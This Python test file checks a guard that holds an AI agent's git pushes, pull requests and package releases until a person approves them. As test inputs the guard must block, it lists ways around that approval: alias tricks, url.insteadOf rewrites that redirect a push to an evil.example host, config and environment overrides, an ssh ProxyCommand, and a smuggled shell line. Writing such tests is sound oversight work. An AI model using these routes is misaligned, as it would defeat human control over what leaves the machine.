"""Publishing: the person's step that takes work off this machine (METHOD.md, "Three rings"). The guard holds an agent's
push, pull or merge request, release, and package until the person says so; `aidd publish` pushes the branch with the
person's decision records and, where a platform runs the gate, opens its pull request and carries their recorded Spec
approvals there; the local trunk is the base while it is ahead of the remote's; and `ship` is retired for three words."""

import json
import re
import shutil
import unittest
from pathlib import Path
from unittest import mock

from helpers import RepoTemplateCase, aidd_subprocess, git
from test_flows import as_person, run_cli, shop, spec_and_tests

from aidd import config
from aidd.cli.commands import typed_decisions
from aidd.guard import approval_commands, publish_commands
from aidd.kernel import git as gitutil
from aidd.platforms import github_person
from aidd.setup import doctor_checks
from aidd.tracking import next_steps
from aidd.workitems import decision_records, goal_history

GIT = shutil.which("git") is not None


def held(root: Path, command: str) -> str | None:
    return approval_commands.forbidden_action(command, str(root))


def publish_agents(root: Path) -> None:
    with open(root / ".aidd" / "config.yaml", "a", encoding="utf-8") as fh:
        fh.write("publish: agents\n")


@unittest.skipUnless(GIT, "git is required")
class PublishGuardTests(RepoTemplateCase):
    """Who may take work off this machine: the guard's side."""

    @classmethod
    def build_template(cls, root):
        shop(root)
        spec_and_tests(root)
        git(root, "remote", "add", "origin", "https://github.com/acme/shop.git")
        git(root, "config", "branch.discount.remote", "origin")

    def test_an_agents_push_and_pull_request_wait_for_the_persons_publish(self):
        for command in ("git push origin discount", "git push -u origin HEAD", "git push", "gh pr create --fill", "glab mr create --fill"):
            with self.subTest(command=command):
                self.assertEqual(held(self.root, command), publish_commands.PUBLISH_HELD)
        self.assertIn("`aidd publish` takes work off this machine", held(self.root, "aidd publish") or "")

    def test_publish_agents_lets_agents_push_and_open_but_never_rewrite_main(self):
        publish_agents(self.root)
        for command in ("git push origin discount", "gh pr create --fill", "glab mr create --fill"):
            with self.subTest(command=command):
                self.assertIsNone(held(self.root, command))
        self.assertIsNotNone(held(self.root, "git push --force origin main"))

    def test_the_persons_publish_grants_a_plain_push_of_that_branch_to_that_remote(self):
        note = typed_decisions.record("publish", str(self.root)) or ""
        self.assertIn("recorded it from their own words", note)
        self.assertIn("to origin (https://github.com/acme/shop.git): run `aidd publish`", note)
        for command in ("git push origin discount", "git push -u origin HEAD", "git push", "aidd publish"):
            with self.subTest(command=command):
                self.assertIsNone(held(self.root, command))
        # The pull request opens through `aidd publish`, which names the repository itself; gh picks its own.
        self.assertEqual(held(self.root, "gh pr create --fill"), publish_commands.PUBLISH_HELD)
        git(self.root, "remote", "add", "other", "https://example.com/other.git")
        for command in (
            "git push other discount",  # another remote
            "git push origin discount:main",  # another branch
            "git push --force origin discount",
            "git push origin --tags",
            "git push --all origin",
            "git push -o ci.skip origin discount",
            "git -c url.https://evil.example/.insteadOf=https://github.com/ push origin discount",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=x GIT_CONFIG_VALUE_0=y git push origin discount",
        ):
            with self.subTest(command=command):
                self.assertIsNotNone(held(self.root, command))  # held: this rule, or a more specific one says why
        git(self.root, "commit", "-q", "--allow-empty", "-m", "the fix the review asked for")
        self.assertIsNone(held(self.root, "git push origin discount"))  # a fix follows the person's publish of the branch
        self.assertEqual(held(self.root, "git push other discount"), publish_commands.PUBLISH_HELD)

    def test_the_grant_ends_where_the_remote_or_the_work_moves(self):
        typed_decisions.record("publish", str(self.root))
        git(self.root, "remote", "set-url", "origin", "https://github.com/someone-else/shop.git")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)  # the URL it named is gone
        git(self.root, "remote", "set-url", "origin", "https://github.com/acme/shop.git")
        self.assertIsNone(held(self.root, "git push origin discount"))
        git(self.root, "switch", "-q", "--orphan", "elsewhere")
        git(self.root, "commit", "-q", "--allow-empty", "-m", "unrelated")
        git(self.root, "branch", "-f", "discount", "elsewhere")
        git(self.root, "switch", "-q", "discount")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)  # not built on what they saw

    def test_a_standing_approval_publishes_only_where_it_was_given(self):
        code, out, err = as_person(self.root, "approve", "all", "--and-publish")
        self.assertEqual(code, 0, out + err)
        self.assertIn("to origin (https://github.com/acme/shop.git)", out + err)
        self.assertIsNone(held(self.root, "git push origin discount"))
        git(self.root, "remote", "add", "evil", "https://example.com/evil.git")
        git(self.root, "config", "branch.discount.pushRemote", "evil")
        self.assertEqual(held(self.root, "git push"), publish_commands.PUBLISH_HELD)  # config now points elsewhere
        self.assertEqual(held(self.root, "git push evil discount"), publish_commands.PUBLISH_HELD)
        git(self.root, "remote", "set-url", "origin", "https://example.com/elsewhere.git")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_an_agent_cannot_redirect_aidd_publish(self):
        typed_decisions.record("publish", str(self.root))
        git(self.root, "remote", "add", "other", "https://example.com/other.git")
        code, out = run_cli(self.root, "publish", "--remote", "other")
        self.assertEqual(code, 1, out)
        self.assertIn("the person decides what leaves this machine", out)

    def test_an_alias_or_another_git_command_that_sends_work_out_is_held(self):
        git(self.root, "config", "alias.p", "push")
        git(self.root, "config", "alias.pp", "p")
        git(self.root, "config", "alias.sync", "!git fetch && git push")
        git(self.root, "config", "alias.st", "status")
        for command in ("git p origin discount", "git pp origin discount", "git send-pack https://example.com/x.git discount",
                        "git http-push https://example.com/x.git discount", "git send-email HEAD~1", "git svn dcommit",
                        "git subtree push --prefix=lib origin lib"):  # fmt: skip
            with self.subTest(command=command):
                self.assertEqual(held(self.root, command), publish_commands.PUBLISH_HELD)
        self.assertEqual(held(self.root, "git sync"), publish_commands.UNREAD_ALIAS)
        for command in ("git -c alias.x=push x origin discount", "git --config-env=alias.x=CMD x"):
            with self.subTest(command=command):
                self.assertIsNotNone(held(self.root, command))  # held: this rule, or the explore rule's one-off alias
        self.assertIsNone(held(self.root, "git st"))
        typed_decisions.record("publish", str(self.root))
        self.assertIsNone(held(self.root, "git p origin discount"))  # read to the push it stands for, inside the grant
        self.assertEqual(held(self.root, "git p https://example.com/x.git discount"), publish_commands.PUBLISH_HELD)

    def test_a_platform_api_call_that_opens_or_pushes_is_held(self):
        for command in (
            "gh api repos/acme/shop/pulls -f title=x -f head=discount -f base=main",
            "gh api -X POST repos/acme/shop/git/refs -f ref=refs/heads/x -f sha=abc",
            "gh api -X PUT repos/acme/shop/contents/README.md -f message=x -f content=eA==",
            "gh api graphql -f query='mutation { createPullRequest(input: {}) { clientMutationId } }'",
            "glab api projects/1/merge_requests -f source_branch=discount",
        ):
            with self.subTest(command=command):
                self.assertEqual(held(self.root, command), publish_commands.PUBLISH_HELD)
        self.assertIsNone(held(self.root, "gh api repos/acme/shop/pulls"))  # a read
        publish_agents(self.root)
        self.assertIsNone(held(self.root, "gh api repos/acme/shop/pulls -f title=x -f head=discount -f base=main"))

    def test_the_grant_needs_a_config_that_sends_the_branch_alone(self):
        typed_decisions.record("publish", str(self.root))
        git(self.root, "config", "push.default", "matching")
        self.assertEqual(held(self.root, "git push"), publish_commands.PUBLISH_HELD)  # every matching branch would go
        self.assertEqual(held(self.root, "git push origin"), publish_commands.PUBLISH_HELD)
        self.assertIsNone(held(self.root, "git push origin discount"))  # the refspec names the branch alone
        git(self.root, "config", "--unset", "push.default")
        git(self.root, "config", "remote.origin.mirror", "true")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_aidd_publish_is_the_agents_where_agents_publish(self):
        publish_agents(self.root)
        self.assertIsNone(held(self.root, "aidd publish"))
        self.assertIsNotNone(held(self.root, "aidd publish --confirmed"))

    def test_a_typed_publish_records_origin_never_the_configured_push_remote(self):
        git(self.root, "remote", "add", "evil", "https://example.com/evil.git")
        git(self.root, "config", "branch.discount.pushRemote", "evil")
        note = typed_decisions.record("publish", str(self.root)) or ""
        self.assertIn("to origin (https://github.com/acme/shop.git)", note)
        self.assertEqual(held(self.root, "git push evil discount"), publish_commands.PUBLISH_HELD)
        self.assertIsNone(held(self.root, "git push origin discount"))

    def test_a_release_or_a_package_is_always_the_persons(self):
        publish_agents(self.root)
        for command in (
            "gh release create v1.0.0",
            "glab release create v1",
            "npm publish",
            "uv publish",
            "cargo publish",
            "twine upload dist/*",
            "docker push acme/shop:1",
        ):
            with self.subTest(command=command):
                self.assertEqual(held(self.root, command), publish_commands.RELEASE_HELD)

    def test_a_push_to_this_machine_is_no_publish(self):
        for command in ("git push . HEAD:refs/heads/copy", "git push /tmp/shop-mirror.git discount", "git push file:///tmp/m.git discount"):
            with self.subTest(command=command):
                self.assertIsNone(held(self.root, command))
        for command in ("git push https://example.com/r.git discount", "git push me@host:r.git discount"):
            with self.subTest(command=command):
                self.assertEqual(held(self.root, command), publish_commands.PUBLISH_HELD)

    def test_anything_that_may_rewrite_where_git_goes_fails_closed(self):
        for command in (
            "git -c url.https://example.com/.insteadOf=/tmp/m push /tmp/m discount",
            "git -C . push /tmp/m discount",
            "GIT_CONFIG_PARAMETERS=x git push /tmp/m discount",
        ):
            with self.subTest(command=command):
                self.assertIsNotNone(held(self.root, command))
        git(self.root, "remote", "add", "mirror", "/tmp/shop-mirror.git")
        git(self.root, "remote", "set-url", "--add", "--push", "mirror", "/tmp/shop-mirror.git")
        git(self.root, "remote", "set-url", "--add", "--push", "mirror", "https://example.com/r.git")
        self.assertEqual(held(self.root, "git push mirror discount"), publish_commands.PUBLISH_HELD)  # one of its URLs leaves
        git(self.root, "config", "url.https://example.com/.pushInsteadOf", "/tmp/")
        self.assertEqual(held(self.root, "git push /tmp/shop-mirror.git discount"), publish_commands.PUBLISH_HELD)

    def test_a_tracking_ref_alone_grants_nothing(self):
        git(self.root, "update-ref", "refs/remotes/origin/discount", "HEAD")  # an agent can write this; the record it cannot
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_text_the_check_cannot_parse_fails_closed(self):
        self.assertIn("takes work off this machine", held(self.root, "echo 'x ; git push origin discount") or "")


@unittest.skipUnless(GIT, "git is required")
class PublishCommandTests(RepoTemplateCase):
    """`aidd publish`: what it pushes, who may run it, and what it carries to the pull request."""

    @classmethod
    def build_template(cls, root):
        shop(root)
        far = root / ".git" / "far.git"
        git(root, "init", "-q", "--bare", str(far))
        git(root, "remote", "add", "origin", str(far))
        git(root, "push", "-q", "origin", "main")
        git(root, "fetch", "-q", "origin")
        spec_and_tests(root)

    def setUp(self):
        super().setUp()
        git(self.root, "remote", "set-url", "origin", str(self.root / ".git" / "far.git"))  # this copy's own remote

    def far(self, *args: str) -> str:
        return git(self.root / ".git" / "far.git", *args)

    def test_a_person_publishes_the_branch_and_their_decision_records(self):
        typed_decisions.record("land it", str(self.root))  # a decision record to carry along
        head = git(self.root, "rev-parse", "HEAD")
        code, out, err = as_person(self.root, "publish")
        self.assertEqual(code, 0, out + err)
        self.assertIn("Leaves this machine: discount", out)
        self.assertIn(f"origin/discount ({self.root / '.git' / 'far.git'})", out)  # the person sees where it goes
        self.assertEqual(self.far("rev-parse", "refs/heads/discount"), head)
        self.assertEqual(self.far("rev-parse", decision_records.DECISIONS_REF), git(self.root, "rev-parse", decision_records.DECISIONS_REF))
        self.assertEqual(git(self.root, "rev-parse", "--abbrev-ref", "discount@{upstream}"), "origin/discount")

    def test_no_records_keeps_them_here(self):
        typed_decisions.record("land it", str(self.root))
        self.assertEqual(as_person(self.root, "publish", "--no-records")[0], 0)
        self.assertEqual(self.far("for-each-ref", decision_records.DECISIONS_REF), "")

    def test_an_agent_publishes_only_on_the_persons_word(self):
        code, out = run_cli(self.root, "publish")
        self.assertEqual(code, 1, out)
        self.assertIn("They type `publish` at the prompt", out)
        typed_decisions.record("publish", str(self.root))
        code, out = run_cli(self.root, "publish")
        self.assertEqual(code, 0, out)
        self.assertEqual(self.far("rev-parse", "refs/heads/discount"), git(self.root, "rev-parse", "HEAD"))

    def test_show_says_what_would_leave(self):
        code, out = run_cli(self.root, "publish", "--show")
        self.assertEqual(code, 0, out)
        plan = json.loads(out)
        self.assertEqual((plan["branch"], plan["to"], plan["remote"], plan["pull_request"]), ("discount", "discount", "origin", False))
        self.assertGreaterEqual(plan["commits"], 1)
        self.assertEqual(self.far("for-each-ref", "refs/heads/discount"), "")  # nothing left this machine

    def test_where_a_platform_runs_the_gate_it_opens_the_pull_request_and_carries_the_spec_approval(self):
        Path(self.root, ".github/workflows").mkdir(parents=True)
        Path(self.root, ".github/workflows/aidd-gate.yml").write_text("name: aidd-gate\n", encoding="utf-8")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "ci: the gate")
        head = git(self.root, "rev-parse", "HEAD")
        decision_records.record_local_approval(decision_records.approve_spec_line("SPEC-1", head), str(self.root))
        pr = github_person.PullRequest("acme/shop", 7, "https://github.com/acme/shop/pull/7", head, "me")
        with (
            mock.patch.object(github_person, "open_pull_request", return_value=(pr.url, None)) as opened,
            mock.patch.object(github_person, "approval_target", return_value=(pr, None)),
            mock.patch.object(github_person, "post_spec_approval", return_value=pr.url) as posted,
        ):
            code, out, err = as_person(self.root, "publish")
        self.assertEqual(code, 0, out + err)
        self.assertEqual(opened.call_args.args[1:3], ("discount", "main"))
        self.assertEqual(posted.call_args.args[1], f"/aidd approve-spec SPEC-1 {head}")
        self.assertIn("carried your Spec approval of SPEC-1", out)
        self.assertIn("Type `merge it`", out)


@unittest.skipUnless(GIT, "git is required")
class PublishEdgeTests(RepoTemplateCase):
    """The grant's limits and `aidd publish`'s other paths."""

    @classmethod
    def build_template(cls, root):
        shop(root)
        far = root / ".git" / "far.git"
        git(root, "init", "-q", "--bare", str(far))
        git(root, "remote", "add", "origin", str(far))
        git(root, "push", "-q", "origin", "main")
        git(root, "fetch", "-q", "origin")
        spec_and_tests(root)

    def setUp(self):
        super().setUp()
        git(self.root, "remote", "set-url", "origin", str(self.root / ".git" / "far.git"))

    def far(self, *args: str) -> str:
        return git(self.root / ".git" / "far.git", *args)

    def test_the_base_branch_goes_as_a_pull_request_branch_with_pr(self):
        git(self.root, "switch", "-q", "main")
        git(self.root, "commit", "-q", "--allow-empty", "-m", "landed here")
        head = git(self.root, "rev-parse", "HEAD")
        with mock.patch.object(github_person, "open_pull_request", return_value=(None, "offline")):
            code, out, err = as_person(self.root, "publish", "--pr")
        self.assertEqual(code, 0, out + err)
        self.assertEqual(self.far("rev-parse", f"refs/heads/publish/main-{head[:7]}"), head)
        self.assertNotEqual(self.far("rev-parse", "refs/heads/main"), head)  # main itself is untouched

    def test_records_the_remote_holds_differently_stay_and_say_so(self):
        typed_decisions.record("land it", str(self.root))
        self.far("update-ref", decision_records.DECISIONS_REF, "refs/heads/main")  # someone else's records there
        code, out, err = as_person(self.root, "publish")
        self.assertEqual(code, 0, out + err)
        self.assertIn("fetch them with", out)
        self.assertEqual(self.far("rev-parse", "refs/heads/discount"), git(self.root, "rev-parse", "HEAD"))

    def test_another_persons_spec_approval_is_never_carried(self):
        Path(self.root, ".github/workflows").mkdir(parents=True)
        Path(self.root, ".github/workflows/aidd-gate.yml").write_text("name: aidd-gate\n", encoding="utf-8")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "ci: the gate")
        head = git(self.root, "rev-parse", "HEAD")
        env = {"GIT_AUTHOR_EMAIL": "someone@example.com", "GIT_COMMITTER_EMAIL": "someone@example.com"}
        with mock.patch.dict("os.environ", env):
            decision_records.record_local_approval(decision_records.approve_spec_line("SPEC-1", head), str(self.root))
        pr = github_person.PullRequest("acme/shop", 7, "https://github.com/acme/shop/pull/7", head, "me")
        with (
            mock.patch.object(github_person, "open_pull_request", return_value=(pr.url, None)),
            mock.patch.object(github_person, "approval_target", return_value=(pr, None)),
            mock.patch.object(github_person, "post_spec_approval", return_value=pr.url) as posted,
        ):
            code, out, err = as_person(self.root, "publish")
        self.assertEqual(code, 0, out + err)
        posted.assert_not_called()

    def test_a_remote_other_than_origin_gets_no_pull_request_from_aidd(self):
        Path(self.root, ".github/workflows").mkdir(parents=True)
        Path(self.root, ".github/workflows/aidd-gate.yml").write_text("name: aidd-gate\n", encoding="utf-8")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-qm", "ci: the gate")
        other = self.root / ".git" / "other.git"
        git(self.root, "init", "-q", "--bare", str(other))
        git(self.root, "remote", "add", "other", str(other))
        with mock.patch.object(github_person, "open_pull_request") as opened:
            code, out, err = as_person(self.root, "publish", "--remote", "other")
        self.assertEqual(code, 0, out + err)
        opened.assert_not_called()
        self.assertIn("no pull request opened", out)

    def test_an_agent_publishes_freely_where_agents_publish(self):
        publish_agents(self.root)
        git(self.root, "commit", "-qam", "publish: agents")
        code, out = run_cli(self.root, "publish")
        self.assertEqual(code, 0, out)

    def test_the_grant_ends_once_its_work_has_landed(self):
        git(self.root, "remote", "set-url", "origin", "https://github.com/acme/shop.git")  # off this machine
        typed_decisions.record("publish", str(self.root))
        self.assertIsNone(held(self.root, "git push origin discount"))
        git(self.root, "switch", "-q", "main")
        git(self.root, "merge", "-q", "--ff-only", "discount")  # the work landed on the trunk
        git(self.root, "switch", "-q", "discount")
        git(self.root, "commit", "-q", "--allow-empty", "-m", "more, after it landed")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_a_record_naming_no_url_grants_nothing(self):
        git(self.root, "remote", "set-url", "origin", "https://github.com/acme/shop.git")  # off this machine
        head = git(self.root, "rev-parse", "HEAD")
        line = f"{decision_records.PUBLISH_TRAILER}: {head}\n{decision_records.BRANCH_TRAILER}: discount\n{decision_records.REMOTE_TRAILER}: origin\n"
        decision_records.record_local_approval(line, str(self.root))
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_a_typed_publish_with_nowhere_to_go_records_nothing(self):
        git(self.root, "remote", "remove", "origin")
        note = typed_decisions.record("publish", str(self.root)) or ""
        self.assertIn("could not record it", note)
        self.assertIn("git remote add origin", note)
        self.assertEqual(git(self.root, "for-each-ref", decision_records.DECISIONS_REF), "")

    def test_config_env_before_push_is_held_under_a_grant(self):
        git(self.root, "remote", "set-url", "origin", "https://github.com/acme/shop.git")
        typed_decisions.record("publish", str(self.root))
        self.assertIsNone(held(self.root, "git push origin discount"))
        self.assertIsNotNone(held(self.root, "git --config-env=url.x.insteadOf=Y push origin discount"))
        self.assertIsNotNone(held(self.root, "HOME=/tmp/elsewhere git push origin discount"))  # another global config

    def test_every_form_the_guard_cannot_read_is_held(self):
        git(self.root, "config", "alias.hi", "!echo hi")  # a shell alias: whatever its text runs
        git(self.root, "config", "alias.y", "-c alias.z=push z")  # options before the command it names
        git(self.root, "config", "alias.p", "push")
        for command in (
            "git hi",
            "git y origin discount",
            "git -C . p origin discount",  # git may read another repository's aliases
            "cd . && git p origin discount",
            "gh api -X POST /repos/acme/shop/pulls?draft=1 -f title=t",  # a query string after the endpoint
            "gh api graphql -F query=@open.graphql",  # a query the guard cannot read
            "gh repo create acme/copy --source=. --push",
            "git lfs push origin discount",
            "git config alias.q push && git q origin discount",  # an alias written on the same line
            "env -C . git p origin discount",  # a wrapper that runs it in another folder
            "builtin cd . && git p origin discount",
            "export GIT_DIR=.git; git p origin discount",
            "git config alias.q push get && git q origin discount",  # a read word only counts first
            "HOME=/tmp git p origin discount",  # git reads another global config
            "gh alias set pc 'pr create' && gh pc",
        ):
            with self.subTest(command=command):
                self.assertIsNotNone(held(self.root, command))
        self.assertIsNone(held(self.root, "gh api graphql -f query='{ viewer { login } }'"))

    def test_a_gh_alias_is_read_as_what_it_stands_for(self):
        folder = self.root / ".git" / "gh-config"
        folder.mkdir()
        (folder / "config.yml").write_text(
            "aliases:\n    pc: pr create\n    co: pr checkout\n    sh: '!gh pr create'\n    rc: release create\n", encoding="utf-8"
        )
        with mock.patch.dict("os.environ", {"GH_CONFIG_DIR": str(folder)}):
            self.assertEqual(held(self.root, "gh pc --fill"), publish_commands.PUBLISH_HELD)
            self.assertEqual(held(self.root, "gh sh"), publish_commands.PUBLISH_HELD)
            self.assertIsNone(held(self.root, "gh co 7"))
            self.assertEqual(held(self.root, "gh rc v9"), publish_commands.RELEASE_HELD)
        self.assertIsNotNone(held(self.root, f"GH_CONFIG_DIR={folder} gh pc"))
        (folder / "config.yml").write_text("aliases: {pc: pr create}\n", encoding="utf-8")  # more YAML than the guard reads
        with mock.patch.dict("os.environ", {"GH_CONFIG_DIR": str(folder)}):
            self.assertEqual(held(self.root, "gh pc"), publish_commands.PUBLISH_HELD)
            self.assertIsNone(held(self.root, "gh pr list"))

    def test_a_push_that_carries_tags_or_submodules_is_held_under_a_grant(self):
        git(self.root, "remote", "set-url", "origin", "https://github.com/acme/shop.git")
        typed_decisions.record("publish", str(self.root))
        self.assertIsNone(held(self.root, "git push origin discount"))
        self.assertIsNotNone(held(self.root, "cd . && git push origin discount"))
        for key, value in (("push.followTags", "true"), ("push.recurseSubmodules", "on-demand")):
            with self.subTest(key=key):
                git(self.root, "config", key, value)
                self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)
                git(self.root, "config", "--unset", key)

    def test_an_ssh_command_in_the_config_is_held_under_a_grant(self):
        git(self.root, "remote", "set-url", "origin", "git@github.com:acme/shop.git")
        typed_decisions.record("publish", str(self.root))
        self.assertIsNone(held(self.root, "git push origin discount"))
        git(self.root, "config", "core.sshCommand", "ssh -o ProxyCommand=elsewhere")
        self.assertEqual(held(self.root, "git push origin discount"), publish_commands.PUBLISH_HELD)

    def test_list_says_how_long_the_trunk_has_gone_unpublished(self):
        git(self.root, "switch", "-q", "main")
        git(self.root, "commit", "-q", "--allow-empty", "-m", "landed here")
        code, out = run_cli(self.root, "list", "--json")
        self.assertEqual(code, 0, out)
        flow = json.loads(out).get("flow") or {}
        self.assertEqual((flow.get("unpublished") or {}).get("commits"), 1)
        code, out = run_cli(self.root, "list")
        self.assertIn("1 commit(s) not published to origin yet", out)


class McpStandingTests(unittest.TestCase):
    def test_approve_all_and_publish_through_the_dialog(self):
        from aidd.cli import mcp_server

        shown, why = mcp_server._approval_preview("approve_all", {"and_publish": True, "but_major": True}, ".")
        self.assertEqual((shown or {}).get("scope"), "all-and-publish-but-major", why)
        self.assertIsNone(mcp_server._approval_preview("approve_all", {"and_publish": "yes"}, ".")[0])


@unittest.skipUnless(GIT, "git is required")
class TypedWordsTests(RepoTemplateCase):
    @classmethod
    def build_template(cls, root):
        shop(root)
        spec_and_tests(root)

    def test_ship_it_records_nothing_and_names_the_three_words(self):
        note = typed_decisions.record("ship it", str(self.root)) or ""
        self.assertIn("could not record it", note)
        for word in ("`land it`", "`publish`", "`merge it`"):
            self.assertIn(word, note)
        self.assertEqual(git(self.root, "for-each-ref", decision_records.DECISIONS_REF), "")

    def test_merge_it_before_the_branch_is_on_a_platform_names_land_and_publish(self):
        note = typed_decisions.record("merge it", str(self.root)) or ""
        self.assertIn("not on a platform yet", note)
        self.assertIn("`land it`", note)

    def test_land_it_on_a_published_branch_names_merge_it(self):
        Path(self.root, ".github/workflows").mkdir(parents=True)
        Path(self.root, ".github/workflows/aidd-gate.yml").write_text("name: aidd-gate\n", encoding="utf-8")
        git(self.root, "remote", "add", "origin", "https://github.com/acme/shop.git")
        git(self.root, "update-ref", "refs/remotes/origin/discount", "HEAD")
        note = typed_decisions.record("land it", str(self.root)) or ""
        self.assertIn("type `merge it` there", note)

    def test_the_retired_command_names_its_replacements(self):
        run = aidd_subprocess("ship", cwd=self.root)
        self.assertEqual(run.returncode, 2)
        self.assertIn("`aidd ship` is retired: `aidd land`", run.stderr)


@unittest.skipUnless(GIT, "git is required")
class TrunkTests(RepoTemplateCase):
    """The local trunk is the base while it holds the remote's and more: work landed here and not published yet."""

    @classmethod
    def build_template(cls, root):
        shop(root)
        far = root / ".git" / "far.git"
        git(root, "init", "-q", "--bare", str(far))
        git(root, "remote", "add", "origin", str(far))
        git(root, "push", "-q", "origin", "main")
        git(root, "fetch", "-q", "origin")

    def setUp(self):
        super().setUp()
        git(self.root, "remote", "set-url", "origin", str(self.root / ".git" / "far.git"))

    def test_the_base_follows_the_local_trunk_until_it_is_published(self):
        root = str(self.root)
        self.assertEqual(gitutil.default_base(root), "origin/main")
        self.assertIsNone(goal_history.unpublished_trunk(root))
        git(self.root, "commit", "-q", "--allow-empty", "-m", "landed here")
        self.assertEqual(gitutil.default_base(root), "main")
        unpublished = goal_history.unpublished_trunk(root)
        self.assertEqual((unpublished or {}).get("commits"), 1)
        self.assertEqual((unpublished or {}).get("remote"), "origin")
        git(self.root, "push", "-q", "origin", "main")
        git(self.root, "fetch", "-q", "origin")
        self.assertEqual(gitutil.default_base(root), "origin/main")
        self.assertIsNone(goal_history.unpublished_trunk(root))

    def test_an_old_unpublished_trunk_warns(self):
        stale = {"branch": "main", "remote": "origin", "commits": 3, "age_days": 9}
        (warning,) = goal_history.flow_warnings([], None, stale)
        self.assertIn("main holds 3 commit(s) origin lacks", warning)
        self.assertIn("they type `publish` on main", warning)
        self.assertEqual(goal_history.flow_warnings([], None, stale | {"age_days": 1}), [])


class AfterReviewTests(unittest.TestCase):
    """What follows Review: land on the local trunk, or publish where the trunk lives on a platform."""

    def step(self, **kw) -> dict:
        data = {"id": "SPEC-1", "route": "normal"}
        return next_steps._spec_step("specs/SPEC-1.md", data, "in_review", committed=True, approval=True, blockers=[], **kw)

    def test_the_trunk_decides(self):
        self.assertIn("type `land it`", self.step(local=True)["how"])
        published = self.step(local=True, publish_first=True)
        self.assertEqual((published["code"], published["who"]), ("spec.publish", "Approver"))
        self.assertIn("type `publish`", published["how"])
        self.assertEqual(self.step(local=True, publish_first=True, publishes=True)["code"], "spec.publish_standing")
        self.assertIn("type `merge it`", self.step(local=False)["how"])


class StandingScopeTests(unittest.TestCase):
    def test_publishing_needs_its_own_word(self):
        self.assertFalse(decision_records.standing_publishes({"scope": "all"}))
        self.assertTrue(decision_records.standing_publishes({"scope": "all-and-publish"}))
        self.assertTrue(decision_records.standing_publishes({"scope": "all-and-publish-but-major"}))
        self.assertFalse(decision_records.standing_covers({"scope": "all-and-publish-but-major"}, "major"))
        self.assertTrue(decision_records.standing_covers({"scope": "all-and-publish"}, "major"))


@unittest.skipUnless(GIT, "git is required")
class DoctorTests(RepoTemplateCase):
    @classmethod
    def build_template(cls, root):
        shop(root)

    def test_bot_agents_that_cannot_push_are_named(self):
        path = self.root / ".aidd" / "config.yaml"
        text = re.sub(r"(?m)^  bots: .*$", '  bots: ["copilot-swe-agent[bot]"]', path.read_text(encoding="utf-8"), count=1)
        path.write_text(text, encoding="utf-8")
        cfg = config.load_file(config.CONFIG_PATH, str(self.root))
        lines = [text for _, text in doctor_checks.goal_lines(self.root, cfg)]
        self.assertTrue(any("set `publish: agents`" in t for t in lines), lines)
        publish_agents(self.root)
        cfg = config.load_file(config.CONFIG_PATH, str(self.root))
        self.assertFalse(any("publish: agents" in t for _, t in doctor_checks.goal_lines(self.root, cfg)))


if __name__ == "__main__":
    unittest.main()
